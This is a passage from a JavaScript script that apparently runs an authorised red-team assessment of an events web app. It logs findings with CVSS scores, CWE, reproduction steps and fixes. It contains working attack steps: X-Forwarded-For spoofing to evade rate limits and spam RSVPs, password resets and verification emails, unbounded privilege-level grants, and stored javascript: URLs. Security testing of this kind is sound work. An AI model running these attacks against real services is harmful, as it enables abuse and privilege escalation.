    const spamEventFetch = await api('/fetchEvent', { method: 'POST', body: JSON.stringify({ id: rosterEventId }) })
    await addProof(browser, {
      id: 'RT-019',
      severity: 'High',
      cvss: '7.2',
      title: 'Guest RSVP can be spammed to inflate attendee counts by spoofing IP headers',
      confirmed: spamSameIp.some((r) => r.status === 429) && spamVariedIp.filter((r) => r.status === 200).length >= 6,
      affected: 'POST /api/attendEventGuest, rateLimit',
      cwe: 'CWE-770 Allocation of Resources Without Limits',
      reproduction: ['Send guest RSVPs with one X-Forwarded-For until 429.', 'Repeat with varied X-Forwarded-For values.', 'Fetch event and observe count inflated.'],
      rootCause: 'Public RSVP relies on spoofable-IP rate limiting and no captcha/email verification.',
      fix: 'Use trusted IP, event-level throttles, CAPTCHA or email confirmation, and anomaly limits.',
      screenshot: '20-guest-rsvp-spam.png',
    }, [
      { heading: 'Same spoofed IP statuses', data: spamSameIp.map((r) => r.status) },
      { heading: 'Varied spoofed IP statuses', data: spamVariedIp.map((r) => r.status) },
      { heading: 'Event count after spam', data: spamEventFetch },
    ])

    // 20. Admin verify accepts arbitrary role levels.
    const targetId = getUserId(emails.target)
    const beforeTarget = await verify(auths.target.token)
    const overLevel = await api(`/admin/users/${encodeURIComponent(targetId)}/verify`, {
      method: 'POST',
      headers: auth(auths.admin.token),
      body: JSON.stringify({ isVerified: true, verificationLevel: 1000008 }),
    })
    const afterTarget = await verify(auths.target.token)
    sql(`UPDATE users SET verification_level=45, is_verified=1 WHERE username='${emails.target}';`)
    await addProof(browser, {
      id: 'RT-020',
      severity: 'Medium',
      cvss: '6.8',
      title: 'Admin user verification accepts unbounded privilege levels',
      confirmed: overLevel.status === 200 && afterTarget.body?.user?.verificationLevel === 1000008,
      affected: 'POST /api/admin/users/:id/verify',
      cwe: 'CWE-269 Improper Privilege Management',
      reproduction: ['As admin, POST verificationLevel 1000008 for a normal user.', 'Verify target token and observe elevated role.'],
      rootCause: 'Admin verify endpoint does not constrain verificationLevel to approved roles or prevent self-created super roles.',
      fix: 'Validate role transitions against an allowlist and require stronger controls for high-privilege grants.',
      screenshot: '21-admin-unbounded-role.png',
    }, [
      { heading: 'Target before', data: beforeTarget },
      { heading: 'Admin verify response', data: overLevel },
      { heading: 'Target after arbitrary level', data: afterTarget },
    ])

    // 21. Password reset request spam invalidates codes via spoofed IP.
    const resetBefore = sqlJson(`SELECT COUNT(*) AS count FROM password_reset_codes WHERE user_id='${escapeSql(targetId)}';`)[0]?.count ?? 0
    const resetSpam = []
    for (let i = 0; i < 6; i += 1) {
      resetSpam.push(await api('/auth/password-reset/request', {
        method: 'POST',
        headers: spoofIpHeaders(`192.0.2.${20 + i}`),
        body: JSON.stringify({ username: emails.target }),
      }))
    }
    const resetAfter = sqlJson(`SELECT COUNT(*) AS count, SUM(CASE WHEN used_at IS NULL THEN 1 ELSE 0 END) AS active FROM password_reset_codes WHERE user_id='${escapeSql(targetId)}';`)[0]
    await addProof(browser, {
      id: 'RT-021',
      severity: 'Medium',
      cvss: '6.5',
      title: 'Password reset requests can be spammed and invalidate prior codes',
      confirmed: resetSpam.every((r) => r.status === 200) && Number(resetAfter?.count ?? 0) >= Number(resetBefore) + 6,
      affected: 'POST /api/auth/password-reset/request',
      cwe: 'CWE-770 Allocation of Resources Without Limits',
      reproduction: ['Send password reset requests for a known username with varied X-Forwarded-For.', 'Observe multiple reset-code rows and only latest active.'],
      rootCause: 'Reset request throttling depends on spoofable IP and no per-account cooldown.',
      fix: 'Add per-account throttles, trusted-IP rate limiting, and abuse monitoring.',
      screenshot: '22-password-reset-spam.png',
    }, [
      { heading: 'Reset row count before', data: resetBefore },
      { heading: 'Reset request statuses', data: resetSpam.map((r) => r.status) },
      { heading: 'Reset row count after', data: resetAfter },
    ])

    // 22. Email verification sends can be spammed by spoofed IP.
    sql(`UPDATE users SET email_verified_at=NULL WHERE username='${emails.target}';`)
    const emailTokenBefore = sqlJson(`SELECT COUNT(*) AS count FROM email_verification_tokens WHERE user_id='${escapeSql(targetId)}';`)[0]?.count ?? 0
    const emailSpam = []
    for (let i = 0; i < 5; i += 1) {
      emailSpam.push(await api('/auth/send-verification-email', {
        method: 'POST',
        headers: { ...auth(auths.target.token), ...spoofIpHeaders(`192.0.2.${80 + i}`) },
      }))
    }
    const emailTokenAfter = sqlJson(`SELECT COUNT(*) AS count FROM email_verification_tokens WHERE user_id='${escapeSql(targetId)}';`)[0]?.count ?? 0
    await addProof(browser, {
      id: 'RT-022',
      severity: 'Medium',
      cvss: '5.9',
      title: 'Email verification sends can be spammed by spoofing IP headers',
      confirmed: emailSpam.every((r) => r.status === 200 || r.status === 500) && Number(emailTokenAfter) >= Number(emailTokenBefore) + 3,
      affected: 'POST /api/auth/send-verification-email',
      cwe: 'CWE-770 Allocation of Resources Without Limits',
      reproduction: ['Make target email unverified.', 'Call send-verification-email repeatedly with varied X-Forwarded-For.', 'Observe new token rows beyond nominal rate limit.'],
      rootCause: 'Rate limit is per spoofable IP, not per account/email.',
      fix: 'Add per-account/email cooldown and trusted-IP enforcement.',
      screenshot: '23-email-verification-spam.png',
    }, [
      { heading: 'Token count before', data: emailTokenBefore },
      { heading: 'Send statuses', data: emailSpam.map((r) => ({ status: r.status, body: r.body })) },
      { heading: 'Token count after', data: emailTokenAfter },
    ])

    // 23. Admin event update also accepts javascript URL.
    const adminEventUpdate = await api(`/admin/events/${encodeURIComponent(rosterEventId)}`, {
      method: 'PUT',
      headers: auth(auths.admin.token),
      body: JSON.stringify({ signupUrl: jsUrl, externalUrl: jsUrl }),
    })
    const adminEventFetch = await api('/fetchEvent', { method: 'POST', body: JSON.stringify({ id: rosterEventId }) })
    await addProof(browser, {
      id: 'RT-023',
      severity: 'Medium',
      cvss: '6.1',
      title: 'Admin event update endpoint lacks URL validation',
      confirmed: adminEventUpdate.status === 200 && adminEventFetch.body?.event?.signupUrl === jsUrl,
      affected: 'PUT /api/admin/events/:id',
      cwe: 'CWE-20 Improper Input Validation',
      reproduction: ['As admin, PUT javascript: URL fields to /api/admin/events/:id.', 'Fetch event and observe stored URL.'],
      rootCause: 'Admin event update duplicates update logic without strict schemas.',
      fix: 'Use shared validated schema for all event mutations.',
      screenshot: '24-admin-event-url-validation.png',
    }, [
      { heading: 'Admin event update response', data: adminEventUpdate },
      { heading: 'Fetched event after admin update', data: adminEventFetch },
    ])

    // 24. Legacy verifyUser accepts arbitrary levels.
    const legacyVerify = await api('/verifyUser', {
      method: 'POST',
      headers: auth(auths.admin.token),
      body: JSON.stringify({ usernameToVerify: emails.target, verificationLevel: 1008 }),
    })
    const legacyVerifyAfter = await verify(auths.target.token)
    sql(`UPDATE users SET verification_level=45, is_verified=1, email_verified_at=created_at WHERE username='${emails.target}';`)
    await addProof(browser, {
      id: 'RT-024',
      severity: 'Medium',
      cvss: '6.8',
      title: 'Legacy verifyUser endpoint accepts arbitrary privilege levels',
      confirmed: legacyVerify.status === 200 && legacyVerifyAfter.body?.user?.verificationLevel === 1008,
      affected: 'POST /api/verifyUser',
      cwe: 'CWE-269 Improper Privilege Management',
      reproduction: ['As admin, POST /api/verifyUser with verificationLevel 1008.', 'Verify target role changed.'],
      rootCause: 'Legacy endpoint has no role allowlist or upper bound.',
      fix: 'Remove legacy endpoint or validate levels exactly like the modern admin path should.',
      screenshot: '25-legacy-verifyuser-unbounded-role.png',
    }, [
      { heading: 'Legacy verifyUser response', data: legacyVerify },
      { heading: 'Target after legacy verify', data: legacyVerifyAfter },
    ])

    // Cleanup red-team events.
    const eventIdsToDelete = [crossCenterEvent.body?.id, jsEvent.body?.id, rosterEventId].filter(Boolean)
    if (eventIdsToDelete.length) {
      sql(`DELETE FROM events WHERE id IN (${eventIdsToDelete.map((id) => `'${escapeSql(id)}'`).join(',')});`)
    }

    await writeFile(`${outDir}/deep-findings.json`, JSON.stringify({ generatedAt: new Date().toISOString(), findings, screenshots }, null, 2))
  } finally {
    await browser.close()
  }
}

main().catch((error) => {
  console.error(error)
  process.exit(1)
})
